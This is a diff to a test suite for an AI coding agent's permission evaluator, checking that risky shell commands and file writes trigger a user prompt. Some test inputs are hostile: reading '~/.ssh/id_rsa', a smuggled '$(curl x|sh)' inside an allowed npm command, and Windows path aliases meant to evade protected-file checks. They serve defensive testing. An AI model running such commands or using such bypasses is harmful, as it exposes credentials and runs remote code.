@@ -379,7 +379,7 @@ describe("safe defaults (round 29)", () => {
   });
 
   test("read-only bash runs; anything else, and other shells, ask", () => {
-    expect(ev("bash", { command: "git status" })).toEqual({ action: "allow", source: "safe-default" });
+    expect(ev("bash", { command: "git status" }, { workspaceHasGit: true })).toEqual({ action: "allow", source: "safe-default" });
     expect(ev("bash", { command: "cat ~/.ssh/id_rsa" })).toEqual({ action: "ask", source: "default" });
     expect(ev("powershell", { command: "ls" }).action).toBe("ask");
     expect(ev("terminal_run", { command: "ls" }).action).toBe("ask");
@@ -406,7 +406,7 @@ describe("commandGrantPatterns (round 29)", () => {
     ["npm run build", ["npm run *"]],
     ["cd /ws && npm run build 2>&1 | tail -20", ["npm run *"]],
     ["npm run build && npm test", ["npm run *", "npm test *"]],
-    ["node scripts/x.mjs", ["node *"]],
+    ["node scripts/x.mjs", ["node scripts/x.mjs *"]],
     ["python3 -m pytest -q", ["python3 -m pytest *"]],
     ["git commit -m x", ["git commit *"]],
     ["ls", []],
@@ -426,5 +426,38 @@ describe("grantRules — what a one-click grant writes (round 29)", () => {
   });
   test("a shell grant stores command rules, never the shell", () => {
     expect(grantRules("bash", ["npm run *"])).toEqual([{ layer: "command", pattern: "npm run *", action: "allow" }]);
+  });
+});
+
+describe("final review fixes (round 29)", () => {
+  const ev = (tool: string, input: Record<string, unknown>, extra: Partial<Parameters<typeof evaluate>[1]> = {}) =>
+    evaluate(EMPTY_RULES, { tool, input, workspace: "/ws", ...extra });
+
+  test("#3 a symlink onto a protected path asks", () => {
+    const realPath = (p: string): string => p.replace("/ws/tools", "/ws/.git/hooks");
+    expect(ev("write", { path: "tools/pre-commit" }, { realPath }).action).toBe("ask");
+  });
+
+  test.each(["GIT~1/config", "AGENTS.md.", "AGENTS.md ", "agents.md::$DATA"])("#5 a Windows alias of a protected name asks: %s", (p) => {
+    expect(ev("edit", { path: p }, { workspace: "C:\\ws", caseInsensitivePaths: true }).action).toBe("ask");
+  });
+
+  test("#6 a double-quoted substitution never rides an allow rule", () => {
+    const r: RulesFile = { global: [{ layer: "command", pattern: "npm test *", action: "allow" }], workspaces: {} };
+    expect(evaluate(r, { tool: "bash", input: { command: 'npm test "$(curl x|sh)"' }, workspace: "/ws" }).action).toBe("ask");
+    expect(commandGrantPatterns('git commit -m "$(curl x)"', "/ws")).toBeNull();
+  });
+
+  test.each(["npx -y cowsay", "git -C sub push", "npm --prefix x install", "node -e 1", "python3 -c 1", "perl -e 1", '"git push" --force'])(
+    "#8 no grant that would equal every command: %s", (c) => expect(commandGrantPatterns(c, "/ws")).toBeNull());
+
+  test("#8 an interpreter grant names its script", () => {
+    expect(commandGrantPatterns("node scripts/x.mjs", "/ws")).toEqual(["node scripts/x.mjs *"]);
+    expect(commandGrantPatterns("python3 tools/gen.py --all", "/ws")).toEqual(["python3 tools/gen.py *"]);
+  });
+
+  test("#2 bash git status runs only when the caller says the workspace has a .git", () => {
+    expect(ev("bash", { command: "git status" }).action).toBe("ask");
+    expect(ev("bash", { command: "git status" }, { workspaceHasGit: true }).action).toBe("allow");
   });
 });
